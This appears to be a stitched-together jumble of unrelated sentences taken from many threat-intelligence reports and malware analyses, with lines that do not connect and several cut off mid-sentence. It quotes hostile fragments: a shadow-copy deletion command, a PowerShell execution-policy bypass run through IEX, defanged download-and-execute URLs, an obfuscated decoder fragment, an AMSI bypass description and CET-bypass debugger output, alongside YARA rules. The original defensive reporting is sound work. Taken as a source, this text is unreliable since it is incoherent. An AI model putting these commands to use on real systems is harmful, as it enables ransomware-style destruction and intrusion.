The script is heavily obfuscated with random symbols that substitute the instructions during the run-time and base64-encoded strings.
The loader injects an orchestrator into memory in a svchost.exe process.
Software supply chain attacks can vary greatly in sophistication, from the recent FireEye-discovered SolarWinds attacks to attacks such as this targeting smaller providers.
Password is the key used to encrypt messages. 
Around 26 hours after the initial infection, while still running the email spreader, the Emotet malware pulled down and executed a Cobalt Strike payload on the beachhead host.
The i2pd binary is stored within the script as a large, inline Base64-encoded variable.
The result is that only small parts of the file—not the entire file—are encrypted.
CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.
T1123Audio CaptureFlowCloud has audio capture functionality. 
Figure 1 - Infection chain Technical Analysis MSBuild MSBuild is a development tool used for building applications, especially where Visual Studio is not installed.[2] MSBuild uses XML project files that contain the specifications to compile the project and, within the configuration file, the “UsingTask” element defines the task that will be compiled by MSBuild.
Figure 2 shows LokiBot activity from ThreatFox. Figure 2.
The action taken by the shortcut is rendered not visible in the Properties sheet, either, in what appears to be a novel, malicious use of an exploit first publicly disclosed a year ago in a blog post by researcher @x86matthew, who works for the UK-based offensive security research company MDSec.
It uses an XOR operation with the key and plaintext being incremented after each four-byte operation.
Each of these transport rules were responsible for deleting the following specific headers from every mail that flowed in the organization: X-MS-Exchange-ExternalOriginalInternetSenderX-MS-Exchange-SkipListedInternetSenderReceived-SPFReceivedARC-Authentication-ResultsARC-Message-SignatureDKIM-SignatureARC-SealX-MS-Exchange-SenderADCheckX-MS-Exchange-Authentication-ResultsAuthentication-ResultsX-MS-Exchange-AntiSpam-MessageData-ChunkCountBy deleting these headers, the attacker tried defense evasion to prevent security products or email providers detecting or blocking their emails and increase the success rate of the spam campaign.
The more recent intrusions took place in 2019 at companies in the aviation industry.
When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
To read more about REvil, its disappearance and the redirect, please refer to our blog, Understanding REvil. 
We still see some remanences from the Ursnif DreamBot in ISFB v2 (file://c:\test\tor64.dll), which might suggest that the Tor communication capability is still possible. 
xxZmgLbpuJ %= 256 YAFIh = position_array[DmqRsaOvxUH] position_array[DmqRsaOvxUH] = position_array[xxZmgLbpuJ] position_array[xxZmgLbpuJ] = YAFIh new_array.append(dec_list[position] ^
Rorschach then stores the numbers in a table for future use. 
The memory is zeroed out
The README file contains a list of URLs that direct targets to the C2 infrastructure associated with Drokbk. 
Using a Next-Gen AV (NGAV) or Endpoint Detection and Response (EDR) tool to detect and contain threats.
The campaign utilizes phishing emails in Portuguese and Spanish, and social engineering tactics to target victims.
Downloadable modules Module IDNameDescription 0xA0C0GetMicInfoSteals database passwords, data and various settings 0x2000ModScanPerforms scan on the specified IP addresses -ProcListGets list of the running processes and their loaded modules 0xA000unknown- 0xA040unknown- 0xA740unknown- 0xA080unknown- Downloadable module: GetMicInfo GetMicInfo is a downloadable component that targets data related to the MICROS POS including passwords tied to two database usernames predefined by the manufacturer: dba and micros (see Figure 2).
Accurately configuring and tuning the deceptive network can deflect the attacker’s lateral movement path towards the deceptive services, consequently allowing the attackers to engage with the deceptive network, helping enterprises protect production assets. 
The infected process that contains IoCs.
This activity appeared to enable information gathering activities. 
Hainan Xiandun employee Wu Shurong cooperated with and carried out orders from PRC Ministry of State Security (MSS) Hainan State Security Department (HSSD) intelligence officers Ding Xiaoyang, Zhu Yunmin, and Cheng Qingmin to conduct CNE.
It does this by creating a thread that checks whether the License file exists.
S1090 NightClub
Phase I: Red Team Cyber Threat Activity Overview The organization’s network was segmented with both logical and geographical boundaries.
But in early October 2022, new samples with the same distinctive C2 protocol used by RapperBot were detected. 
User activity FlowCloud is able collect a miscellany of data that we have decided to group under the “User activity” umbrella. 
Oci.dll payloads in System32 (view from Singularity Console) 
The team was then able to move from the private DC to workstations in the private subnet. 
For example, the APT group Gamaredon has put LNK files to work, including a campaign that started in August 2022 against organizations in Ukraine. 
C&CN/A Downloaded fromN/A DetectionLinux/NukeSped.
Modifying the trap flag bit (uses 0x100) 
The below figure shows the list of services targeted by the ransomware by service name. 
If one of these approaches is successful, GetMicInfo attempts to connect to the database using the following connection string: DBN=micros;UID=dba;ENG=sql%PCNAME%;PWD=%decrypted_DataS5% %PCNAME% represents the computer name retrieved via the GetComputerName API and %decrypted_DataS5% stands for the decrypted dba user password. 
Monitor for newly executed processes that can be used to discover remote systems, such as ping.exe and tracert.exe, especially when executed in quick succession [DS0009]. System Network Configuration Discovery: Internet Connection Discovery T1016.001 The actors’ malware tests for internet connectivity by pinging 8.8.8.8. Mitigation: Monitor executed commands, arguments [DS0017] and executed processes (e.g., tracert or ping)
The adversary infrastructure on GitHub used for staging the attack has now been taken down.
Ransomware operators often use open-source projects to aid their intrusion activities; Royal operators have recently been observed using Chisel, a tunneling tool transported over HTTP and secured via SSH [T1572], to communicate with their C2 infrastructure.
S0561 GuLoader
T1574.002
35 and 37ServerResponse to message 36 or 38. 
If the team had previously acquired the credentials, they used asktgt to impersonate the account.
Attribute Lookup Dispatch Detects available entities and routes them to attribute lookup playbooks.
As an example, we used this event to develop the analytic “Windows Query Registry UnInstall Program List'' that monitors suspicious processes accessing “uninstall registry”.
A sample of the information included with this event is below: Figure 9.
Thomson Reuters Iran’s Evolving Approach to Asymmetric Naval Warfare.
no.txt contains VBScript code that downloads and executes hxxp://[redacted].67[.]12:222/j[.]png (SHA2: 460d093a55b930e733c60575f82183cd0edd52ec6b927cdb4a93dc5da7f0ac9c), which is a PowerShell script that creates the following files: C:\ProgramData\Document\py.ps1 C:\ProgramData\schtasks\Microsoft.bat C:\ProgramData\Document\x.ps1 The script then runs Microsoft.bat, which uses MSHTA.exe to run PowerShell code to run py.ps1.
"C: & cd \ & dir $temp\*.hive" cmd /C
More than 90 of the total published leak site infections occurred in the year 2022 alone. 
T1090.003 Proxy: Multi-hop
Fig 7 — Nemesis waits for data collection tasks to complete, then adds the data to a zip archive to be sent to the C2 Fig 8 — Nemesis uploads data to the C2 via a HTTP POST request The C2 address for the analysed sample is https[:]//es-megadom[.]com Fig 9 — Nemesis Configuration A Tangled Web Provides Opportunities This analysis highlights the intricate relationships between cybercriminal groups and their members.
Figure 6.
The tool allowlisted the entire c:\drive, enabling the actors to bypass virus scans for tools they downloaded to the c:\drive. 
The export OnKeyT_ContextInit contains code that decrypts hardcoded shellcode (see Figure 4) and injects it into iexplore.exe using WriteProcessMemory. 
One common initial access technique that this Trojan Stealer uses is a phishing URL link.
Mitigation: Employ anti-malware to automatically detect and quarantine malicious scripts [M1049]. 
The HTML file has an embedded malicious URL “hxxps[://]facturacionmarzo[.]cloud/e/archivos[.]pdf[.]html” in its metadata section.
According to open-source reporting, victims have unknowingly installed malware that delivers Royal ransomware after receiving phishing emails containing malicious PDF documents [T1566.001], and malvertising [T1566.002].[2] Remote Desktop Protocol (RDP).
This blog will examine Guloader’s latest VBScript/PowerShell execution techniques in more detail. 
Scheduled Task T1059.001:
We have found that this attempt to deliver the LokiBot malware has strong ties to a BEC campaign.
In this post, we will share a novel and especially interesting technique the samples use to hide data, along with detailed analysis of both files that was performed with the support of FLARE analysts. 
Part of the code for the mentioned operations is shown in Figure 17. Figure 17.
Ultimately, this CMD file calls the "db" file.
Note: Merlin is a post-exploit tool that leverages HTTP protocols for C2 traffic. 
Post-infection, the machine will have an instance of an otherwise benign Windows binary running.
S1048 macOS.OSAMiner
The table above shows the data collected from the malware.
Since then, we have been tracking the threat actor’s every move, witnessing the damages and great financial losses they brought upon the payments industry. 
The Python library combined with the script code is compiled with py2exe.
Using this RMM agent they proceeded to install AnyDesk on the host.
The document contains "C:\Users\Iran" paths that were likely included to obfuscate the source of the activity. 
Propagation through GPO In early 2022, we further observed new TTPs used to spread malware in the victim’s environment.
Named sll.exe, this downloader is digitally signed with the certificate seen in Figure 23.
S0346 OceanSalt
"cmd" /c cd /d C:\MS_DATA\&makecab da.back d.zip >1.txt&cd For lateral movement, the attackers made use of the PsExec tool and the net use command for accessing shared resources on remote machines. 
Microsoft assesses that MERCURY gains access to the targets through remote exploitation of an unpatched internet-facing device.
Malicious Actors are always trying to find new ways in to infect their victims.
This value, named as the created folder, is set to the path of the copied executable. 
This new wiper showed similarities to previously seen botnets targeting modems using VPNFilter.
Most of Dolphin’s capabilities are controlled through commands. 
This makes static analysis difficult to conduct.
S0349 LaZagne
Attackers can use legitimate domains that are registered under the same CDN provider.
The login form that is presented to the target is designed to capture entered credentials. 
Chinese state-sponsored cyber actors remain agile and cognizant of the information security community’s practices.
They uncovered an obvious overlap in the credentials used by this threat and the presence of those same accounts in previously breached databases.
Trickbot placing hooks on wininet.dll functions.
These file extensions include .nvram,.vmdk,.vmem,.vmsd,.vmsn,.vmss,.vmx,.vmxf, and .vswp.
The PowerShell command contained the payload storage location and encryption keys.
Further examples included typos of commands: C:\Windows\system32\cmd.exe /C
Consider soliciting support from a third-party incident response organization that can provide subject matter expertise to ensure the actor is eradicated from the network and to avoid residual issues that could enable follow-on exploitation. 
.wpd .wps .xcodeproj .xhtml .xlr .xls .xlsx .xml 
As of this writing, we cannot determine if this attack caused the disruption of critical services provided by the comptroller general, although it is likely that any detected service disruptions on the domain are related to this attack.
This is a lightweight module that doesn’t have an assigned ID.
Maintaining vigilance and implementing effective security measures are imperative to mitigate the risks posed by this persistent threat actor. 
FedEx Phishing Campaign Abusing TrustedForm and PAAY
This report details the following variants of IcedID: Standard IcedID Variant – The variant most commonly observed in the threat landscape and used by a variety of threat actors. 
Check and modification of executable module in log.dllA similar technique has been previously described by ESET in the context of Winnti attacks on universities in Hong Kong.
There are a number of theories about the origins of Ransom Cartel.
Seatbelt is a C# project that performs a number of security oriented host-survey “safety checks” relevant from both offensive and defensive security perspectives. 
-eq 0 ];then rm -rf "$0" fi exit 0 
Next-Generation Firewalls:
Dolphin loader The Dolphin loader consists of a Python script and shellcode. 
There is a unique thread per volume, making the wiping process very long. 
Provide robust anti-phishing training for employees and staff.
FROM Win32_ComputerSystem WMI query) 28 Returns the list of connected PCI devices. 29 Returns names of shortcuts in the Desktop directory. 
Specifically, the discrete logarithm of any generator with respect to another one should not be known, not even to the protocol designers.
Figure 13.
"fDenyTSConnections" /t
This file contains credentials used by the updater to connect to a remote bucket in the Alibaba Cloud. 
Symmetric Cryptography [T1573.001] Encrypted Channel:
Figure 2: Original and decoy sites comparison As you can see from the example above, the threat actor took extended measures to ensure that the delivery chain looks legitimate even to technical users.
The exploitation stage is where the attacker gains access to the target system.
In the case of spam messages sent to Microsoft-hosted consumer email accounts (outlook.com), the spam emails were moved into customers’ junk folders before they could be viewed and clicked. 
PT products detection names 9.1 PT Sandbox Trojan-Dropper.Win32.Higaisa.a Backdoor.Win32.CobaltStrike.a Trojan-Dropper.
XWorm is a commodity RAT (Remote Access Trojan) reportedly sold in underground forums for $30 to $150.
We essentially add the team server’s IP address into the proxychains configuration and connect with xfreerdp. 
The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint CSA to disseminate known Royal ransomware IOCs and TTPs identified through FBI threat response activities as recently as January 2023. 
The exploit payload then downloaded mdeploy.text from 182.54.217[.]2/mdepoy.txt to C:\users\public\mde.ps1
TA0040 Impact T1486.
Notice the added “s” in posts:./wp-content/plugins/posts-layoutsSince the vulnerability allows for unauthenticated takeover of websites, attackers are able to take full administrator control of victim environments and install malicious plugins like the one above.
[12/May/2023:21:18:00 +0000] "POST /wp-admin/theme-editor.php?wc-ajax=1&file=header.php HTTP/1.0" 200 45863 "https://<redacted>/wp-admin/theme-editor.php?wc-ajax=1&file=header.php" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0" 139.162.234.6 - - [12/May/2023:21:18:02 +0000] "GET /wp-admin/theme-editor.php?theme=<redacted>&file=header.php&wp_scrape_key=9d62c27a9d88828dc1afaa4927b0550f&wp_scrape_nonce=395126822 HTTP/1.0" 200 46029 "-" "WordPress/6.2; https://<redacted>" .. 193.169.195.64 - -
Cisco Secure Network/Cloud Analytics (Stealthwatch/Stealthwatch Cloud) analyzes network traffic automatically and alerts users of potentially unwanted activity on every connected device.
== 2 and uint32(i*512+0x70+uint16(i*512+0x70+0x22)+4) == uint32(i*512+0x88)-0x30 ) ) } rule HUNTING_Win_CLFS_Entropy { meta: author = "adrien.bataille@mandiant.com" description = "This rule looks for CLFS containers with records containing high entropy.
Notable examples include the UEFI bootkit used as part of the FinSpy surveillance toolset that we reported on, the work of our colleagues from ESET on the ESPectre bootkit, and a little-known threat activity that was discovered within government organisations in the Middle East, using a UEFI bootkit of its own (briefly mentioned in our APT trends report Q3 2021 and covered in more detail in a private APT report delivered to customers of our Threat Intelligence Portal). 
The team initiated a second spearphishing campaign, similar to the first, to target these users.
The most notable elements of the ESP are the Boot Manager and OS loader, both invoked during the machine’s boot sequence and which also happen to be the subject of tampering in the case of the aforementioned bootkits. 
Remove the infected system from all networks, and disable the computer’s wireless, Bluetooth, and any other potential networking capabilities.
Infection Flow: Figure 10 Infection Chain Spam email delivers a malicious OneNote file as an attachment or a link to a ZIP file that contains a OneNote file. 
Using several modules, the malware can infect vulnerable devices built on diverse architectures and operating systems, find additional devices to infect, achieve persistence, and attack a range of protocols.
It targets the browsers we have seen in the static analysis codes.
G0102 Wizard Spider
They have not released information regarding if unauthorized users had accessed the database while it was public. 
They then returned 18 hours later to install further malware with high privileges. 
This vulnerability, registered as “CVE-2018-17153,” can allow for unauthorised actors to bypass authentication and register their activity on a specific IP address as an administrator.
When malware wants to grant write or execute permissions flNewProtect argument will be set to PAGE_EXECUTE_READWRITE (0x40) or PAGE_EXECUTE_READ (0x20). 
On each infected site the parameter names and hashes used for verifying passwords are different.
Black Basta affiliates have been very active deploying Black Basta and extorting organizations since the ransomware first emerged.
[Unit] Description=xxx [Service] Type=forking ExecStart=<path to current file> -x ExecStop=/usr/bin/id [Install] WantedBy=multi-user.target After running the code dependent on the parameters, if the operator has not chosen a GUID with the “-f” parameter, the malware generates a random GUID and writes it to a file similarly named as the current file, with a “d” appended to it.
The parent process of this command was C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p
Tax season is particularly appealing to threat actors because not only are people busy and under stress, but it is intrinsically tied to financial information.
(The tax filing deadline this year is April 17, 2023.) 
Crosswalk has broad capabilities for connecting to C2 servers.
DBEA7F0C0D2BF8BC365A2D1572CA1538FE8FB9A3responsor.datWin32/Agent.
Arrival vectors We previously summarized the arrival vectors used by Earth Preta by categorizing them into three types (DLL sideloading, shortcut links, and fake file extensions).
Although the original developer already stopped maintenance and removed the download link, it’s still getting more popular in the recent cyber-attack.
VALIDATE SECURITY CONTROLS 
Enabling and monitoring enhanced PowerShell logging can capture malicious code as it executes and legitimate WMI persistence is so rare that malicious persistence quickly stands out when enumerating it across an environment.
The data structure is as follows: Configuration size (4 bytes) 
This file can create a local user account
UAC is typically set to “1” by default. 
As security analysts, we want to focus on suspicious techniques, such as PowerShell, used to download files… or execute scripts… or evade defenses… Monitoring or Reporting on NetWalker Events Events from McAfee Endpoint Protection and Web Gateway play a key role in NetWalker incident and threat response.
The resulting hash is used as an AES key with a random 16-byte initialization vector (IV) for encrypting a data blob consisting of four null bytes followed by session_private_1. Figure 8.
[CPG 3.4].
ds:00007ffb`eccd13a8=00007df600000000 0:000> ntdll!LdrpDispatchUserCallTarget+0x23: 00007ff8`7c5fc643 48ffe0 jmp rax {coop!OffSec::trigger (00000001`400186a0)} ... 
[D3-FA] Network Traffic Analysis Client-server Payload Profiling [D3-CSPP] Process Analysis Process Spawn Analysis Process Lineage Analysis [D3-PLA] Isolate: Network Isolation Inbound Traffic Filtering [D3-ITF] 
Default location is %WINDOWS%\Temp.
Phishing trying to steal personal and credit card data. 
Cobalt Strike’s versatility comes from the ability to change the indicators with each payload.
Initial access brokers are actors who offer to sell compromised network access.
The below courses of action mitigate the following techniques: System Network Configuration Discovery [T1016],
Conclusion POSHSPY is an excellent example of the skill and craftiness of APT29.
ATT&CKTechniquesT1021 - Remote ServicesT1021.001 -
Prior to this shift, most of the data collection efforts were aimed at academic institutions, ore and material refineries, specialized fabrication plants, financial institutions, and energy production and distribution. 
CommandsDescriptionwmic SHADOWCOPY DELETE /nointeractiveThis command uses the Windows Management Instrumentation Command-line (WMIC) to delete all shadow copies without user interaction.
VMProtect is a commercial software intended to make analysis of code extremely difficult by implementing a custom virtual machine with non-standard architecture.
How do the IronPython scripts get run?
Detection of this attack path happens much earlier, however the decoy network setup keeps the adversaries engaged, helping admins to study their Tools and Techniques. Figure 23 – Decoy machines running clients pointing to decoy services A similar deception setup can also be done for the browsers where saved credentials can point to the decoy applications and services within the domain.
Since the sample we obtained is a PE file, when we run it after the appropriate environment is prepared and watch its mobility, it continues to run under the name “tmp.exe” by unpacking itself to the “C:\Users\admin\AppData\Local\Temp\” file path. 
This means that the actual data from the document’s text is stored in the WaitList.dat file, not just the metadata.
The configuration uses JSON format, with hash-like keys.
There is a PDF file attached that promises a photo of the infraction, as well as information about time and place of the incident.
T1102.002Web Service: Bidirectional CommunicationDolphin communicates with Google Drive to download commands and exfiltrate data. 
Note: this technique also applies to Defense Evasion
The IOCs related to these stories are attached to the Community Threat Briefing and can be used to check your logs for potential malicious activity. 
It can extract cookies from Google Chrome, Microsoft Edge, Opera, and Firefox.
After being dormant for over two days, a Cobalt Strike Beacon was dropped and executed on the system infected with IcedID.
S0343 Exaramel
Figure 9 – Files encrypted by NoEscape Ransomware Delete System Backup & Shadowcopy Additionally, the ransomware runs a series of commands to delete shadow copies and system backups, effectively preventing file recovery attempts.
Known TeamTnT domain borg[.]wtf.
Operators can choose to configure their server to respond to beacon requests in A, AAAA or TXT records.
A5C02ABE698300F3DE0B7CC7F0856652753831DAlibcurl.dllWin32/Agent.TWILookBack trojanized libcurl loader. 
PowerShell script to create a ImmediateTask through GPO 
The team queried AD for AD users (during Phase I and II), including for members of a SharePoint admin group and several standard user accounts with administrative access. 
Constructing a unique system identifier and creating a mutex Next, the malware will determine if it is running as an account with administrator privileges or simply as a regular user using the GetTokenInformation API.
The .NET injectors and bootstrappers contain clean code and meaningful function/method/variable names, and they use detailed log/error messages.
Output from mim220 (top) and mim221 (bottom) 
[TA0003], Privilege Escalation [TA0004], and Defense Evasion [TA0005]. 
The exploit payload created a Scheduled Task
S0386 Ursnif
FortiGuard Labs provides Backdoor.
Microsoft has started to enforce default search order on many of their applications, even if not universally.
The threat actors also expressed interest in other access methods such as RDP, VPN and corporate email credentials.
The recent shift to a business-centric model of Ransomware-as-a-Service is a clear sign that it is stepping up, so it seems that the NetWalker group is following in the footsteps of REvil and other successful RaaS groups.
One simply can point Rita to the Zeek logs and wait for the results.
Further analysis showed that the malware was based on a 2018 version of the binary (original hash: 5ced5d5b469724d9992f5e8117ecefb5) with only six bytes of data appended, as shown in Figure 4. Figure 4: CyberChef diff between MSHTA.exe and smartpss.exe Phase 3: Downloaded VBScript and PowerShell Upon execution, the modified Mshta file was executed with the URL, hxxp://sdoc[.]xyz/ID-508260156241, and passed as an argument on the command line. 
Noting the malware’s capability to scann KeePass, we looked into the possible abuse of the KeePass security gap CVE-2023-24055, which forces the application to dump stored passwords in plain text (a feature already disabled in recent patches and versions).
The malicious rc.dll loads a file named rc.bin in memory. 
Table 4: Hive Actors ATT&CK Techniques for Enterprise Initial Access Technique Title ID Use External Remote Services T1133 Hive actors gain access to victim networks by using single factor logins via RDP, VPN, and other remote network connection protocols. 
0x8070A0 Retrieve the list of recordings made by a plugin with the specified ID. 
We observed the first sample in June 2022, when it was targeting SSH and not Telnet services.
The VBA code is distributed over several different modules inside the document and is executed by the Document.
1 [serial number: 0x7077BC2C device path: \VOLUME{01cf89bc76f2a351-7077bc2c}] Incident #2 The threat actor almost immediately installed Cloudflare’s freely available tunnelling software here, C:/ProgramData/windows_update.exe, followed by the download and execution of another dual-use agent, Radmin [T1572 – Protocol Tunneling ]
Discovery TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) 
/S
A list of indicators is also available in the OTX Pulse.
Analysis Ex-Conti Members Deploy Domino in Recent Campaigns Former members of ITG23 (aka the Trickbot/Conti syndicate) are likely behind recent campaigns using the Dave Loader to load Domino Backdoor and probably collaborated with current or former ITG14 developers to purchase or use the new malware family.
The cybercriminals behind ViperSoftX are also skilled enough to execute a seamless chain for malware execution while staying under the radar of authorities by selecting one of the most effective methods for delivering malware to consumers.
In response, the server returns the relevant array of messages for the client or, if no new messages have arrived in the last 10 seconds, an empty response.
Decrypted REvil configuration.
The hostname header is selected from the following list: www.google.com www.facebook.com www.gstatic.com twitter.com The user-agent is also randomized and is selected from the following list: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0)
The archives often include a JavaScript (.js) file that downloads and executes the GlobeImposter payload. 
One of the most relevant announced features is that it is a fully undetectable version.
The phishing attachment was submitted to the target in a response to an ongoing conversation that was being held between a member of Quadrant’s client and the TPV.
Maintaining a rigorous patching cycle continues to be the best defense against the most frequently used attacks. 
Nonetheless, the infected DLL contains just one method (named DynamicRun), that can receive a C# script from a web request, compile it on the fly, and execute it. Figure 13: Original DLL Figure 14: The malicious addition that calls the DynamicRun method This code provides an attacker the ability to send and execute any arbitrary C# program on the victim’s device.
The attackers have obfuscated the loader with many calls to a function that just prints some hardcoded values.
Uses ChaCha20 or RSA-4096 to encrypt victims. T1489.
T1105
In terms of attribution, the tooling suggests an immediate link to the ‘Operation Soft Cell’ campaign but remains slightly vague on the specific threat actor.
S0382 ServHelper
[2] Eclypsium Blog - TrickBot Now Offers 'TrickBoot': Persist, Brick, Profit Revisions March 17, 2021:
The same goes for 185.106.94[.]146, which is called by IP in the script, and which at the time resolved to jira.letmaker.top, a widely reported known 8220 Gang domain. 
This method speeds up the brute forcing process significantly because it doesn’t have to go over a huge list of credentials. 
PrincipalIaaS / Admin / Azure Application Administration ActivitiesSaaS / Compliance / New Email RuleSaaS / Compromise / Unusual Login and New Email RuleSaaS / Email Nexus / Suspicious Internal Exchange ActivitySaaS / Email Nexus / Possible Outbound Email SpamSaaS / Compromise / Unusual Login and Outbound Email SpamSaaS / Compromise / Suspicious Login and Suspicious Outbound Email(s)Figure 3: DETECT Model Breaches highlighting unusual login and 'PerfectData Software' registration activity from a malicious actor.
With some further process injection they then began to enumerate SMB shares across the environment and on finding a primary file server reviewed several documents present on the server.
Bypassing the CET Shadow Stack with COOP The vulnerable application we wrote is compiled with CET and CFG in addition to DEP, which is on by default. 
Older Linux versions use $HOME/.config/autostart instead of $HOME/.config/ssh.service. 
This proxied traffic reported back the hostname of the threat actors machine as “mikespc”.
If critical vulnerabilities remain unpatched, cyber threat actors can carry out attacks without the need to develop custom malware and exploits or use previously unknown vulnerabilities to target a network. 
When the script is executed, the system will swap out the numbers in the body for the place in the key string.
Drokbk: Drokbk.exe is a custom .NET implant with two components: an installer, sometimes accessed from a compressed archive on a legitimate file-sharing platform, and a secondary backdoor payload.
OnTime function commonly used to schedule the execution of a specific VBA procedure instead of directly calling it.
Text.
The infection appeared to have started with a drive-by-download from Chrome for the executable ‘update.exe’. 
WebClient 
[T1569 – System Services] Service Name: TcwvBcuf Action: %COMSPEC% /Q /c
rundll32.exe %Profile%\update.dll,#1 5pOygIlrsNaAYqx8JNZSTouZNjo+j5XEFHzxqIIqpQ== Command #2:
Figure 29: VirusTotal page showing the botpack used in the Lite Loader. 
ut natus facere quibusdam" fullword ascii$s6 = "Velit consequuntur quisquam tempora error" fullword ascii$s7 = "Corporis minima omnis qui est temporibus sint quo error magnam" fullword ascii$s8 = "Quo omnis repellat ut expedita temporibus eius fuga error" fullword ascii$s9 = "Officia sit maiores deserunt nobis tempora deleniti aut et quidem fugit" fullword ascii$s10 = "Rerum tenetur sapiente est tempora qui deserunt" fullword ascii$s11 = "Sed nulla quaerat porro error excepturi" fullword ascii$s12 = "Aut tempore quo cumque dicta ut quia in" fullword ascii$s13 = "Doloribus commodi repudiandae voluptates consequuntur neque tempora ut neque nemo ad ut" fullword ascii$s14 = "Tempore possimus aperiam nam mollitia illum hic at ut doloremque" fullword ascii$s15 = "Et quia aut temporibus enim repellat dolores totam recusandae repudiandae" fullword ascii$s16 = "Dolorum eum ipsum tempora non et" fullword ascii$s17 = "Quas alias illum laborum tempora sit est rerum temporibus dicta et" fullword ascii$s18 = "Sed velit ipsa et dolor tempore sunt nostrum" fullword ascii$s19 = "Veniam voluptatem aliquam et eaque tempore tenetur possimus" fullword ascii$s20 = "Possimus suscipit placeat dolor quia tempora voluptas qui fugiat et accusantium" fullword asciicondition:( uint16(0) == 0x5a4d and filesize < 2000KB and ( 1 of ($x*) and 4 of them ))
G0085 FIN4
Monitor for modification of accounts in correlation with other suspicious activity [DS0002]. 
Delete the shadow volumes Later, the malware will enumerate the logical units, prepare the new extension for the future encrypted files, based on the size that is defined in the ransomware config with a random extension, and encrypt all files in the fixed type units and remote units with the new extension. 
title: When byte code bites: Who checks the contents of compiled Python files? url: https://securityboulevard.com/2023/06/when-byte-code-bites-who-checks-the-contents-of-compiled-python-files/ During our continuous threat hunting efforts to find malware in open-source repositories, the ReversingLabs team encountered a novel attack that used compiled Python code to evade detection.
remove Removes the specified connector. 
After gaining access and leveraging Active Directory (AD) data, the team gained persistent access to a third host via spearphishing emails.
00000000`00590d80 00000000`001e0000 0:000> t coop!OffSec::trigger+0xa: 
The rootkit uses several evasion techniques: AMSI bypass: PowerShell inline script patches “amsi.dll!AmsiScanBuffer” to always return “AMSI_RESULT_CLEAN”. 
In this case, the Windows Command Processor was used to invoke PowerShell, which then leveraged Invoke-Expression (IEX) for this purpose.cmd.exe /Q /c powershell.exe -exec bypass -noni -nop
= 3 → SeShutdownPrivilege & SeDebugPrivilege PRIV_FLAG
Files in the new arrival vector After analyzing the downloaded archive, we discovered it to be a malicious RAR file with the TONEINS malware libcef.dll and the TONESHELL malware ~List of terrorist personnel at the border.docx.
The dropper binary unpacks a customized Mach-O compiled from the open source i2pd (I2P Daemon) project.
Flat visualization of binary data of the different ransomware variants Figure 28.
The following shows the thread function for the Forked DLL Loader.
Endnotes [1] “MSBuild,” Microsoft Visual Studio Docs, accessed May 3, 2021, published November 4, 2016, https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild?view=vs-2019. 
The “Hack Tool” present on sites such as YouTube, torrent sites, etc., mainly contains such malware. 
Its most highly targeted industry verticals include professional services, construction, wholesale and retail, and manufacturing. 
Once the master key is decrypted, it will parse the AES IV (Initialization vector) and the encrypted password in the copied “Login Data” database file to decrypt it using AES GCM algorithm.
CatB malware will also attempt to locate and extract sensitive information from Windows Mail profile data (\AppData\Local\Microsoft\Windows Mail\). 
Python Audit inventory systems for unauthorized Python installations. 
They used multiple malicious PDFs and MS Office documents during the campaign.
Executive Summary Threat Identifiers Name LummaC2 Threat Type Stealer Detections VirusTotal Symptoms Stealers are designed to stealthily infiltrate the victim’s computer and remain silent.
Amounts Extorted Working under the hypothesis that all the incoming transactions are ransomware payments; we can make the following observations: We found 23 transactions where the ransom payments were not split up and the beneficiaries are the two bitcoin addresses found by following the transactions mentioned in the underground forum post.
After that, we opened the link information, and many malicious files and IP addresses were displayed.
Downloaded data from public file storage.
Windows Service [T1543.003] Windows Event Logs Detect account compromise Analyze compromised host Develop response plan None Domain Admin Lateral Movement—Workstation to Domain Controller Use a previously compromised domain admin account to upload and execute a payload via SMB and Windows Service Creation, respectively, on a target DC. 
Dave Loader The sample analysed for the purpose of this report is a 64-bit executable with MD5 hash 2CC79806701F1A6E877C29B93F06F1BB and a reported compile date of 28 February 2023.
Finally, the ransomware payload encrypted files found on the file system of the targeted devices by changing the file name extension to DARKBIT and dropped ransom notes. 
REvil session secret generation function.
Stage 2 embedded binary files Name MD5 SHA-1 SHA-256 iQVW64.SYS (CVE-2015-2291) Vulnerable Intel driver, used for kernel exploitation 1898ceda3247213c084f43637ef163b3 d04e5db5b6c848a29732bfd52029001f23c3da75 4429f32db1cc70567919d7d47b844a91cf1329a6cd116f582305f3b7b60cd60b Driver.
After injecting into various processes on the host, the threat actors executed the PowerShell script Invoke-Kerberoast.
Another possible way is to use a sandbox and download memory dumps from a finished analysis in order to run static analysis tools.
Conti followed their claims of an attack on Costa Rica with an attack on Peru that affected the General Directorate of Intelligence (digimin[.]gob[.]pe) and Ministry of Economics and Finance (mef[.]gob[.]pe).Figure 3: Announcements of attacks on Costa Rican and Peruvian government entities by the Conti Gang (Source: Conti.News)ALPHV (BlackCat)On April 16, 2022, the ransomware gang ALPHV (BlackCat) leaked an unspecified amount of compromised data related to the Municipality of Quito, Ecuador (quito[.]gob[.]ec).
In some cases, the actor used a preconfigured (hard-coded) target lists, which is showing the intended victims.
[20] “Budworm: Espionage Group Returns to Targeting U.S. Organizations.”
Table 1: Technical information gathering techniques observed by CISA MITRE ID Name Observation T1245 Determine Approach/Attack Vector 
[T1048.003] Impact [TA0040] Data Encrypted for Impact [T1486] Resource Hijacking [T1496] System Shutdown/Reboot [T1529] Disk Wipe: Disk Structure Wipe
This suggests a low-confidence connection between Microcin and MoonBounce and may indicate usage of shared resources between SixLittleMonkeys and APT41 or involvement of the former’s operators in the MoonBounce activity. 
This technique is based on the fact that some low-level DLLs, such as NTDLL, contain numbers of raw syscalls.
Before we look into that detection method, let’s have a quick lesson on TLS handshakes. 
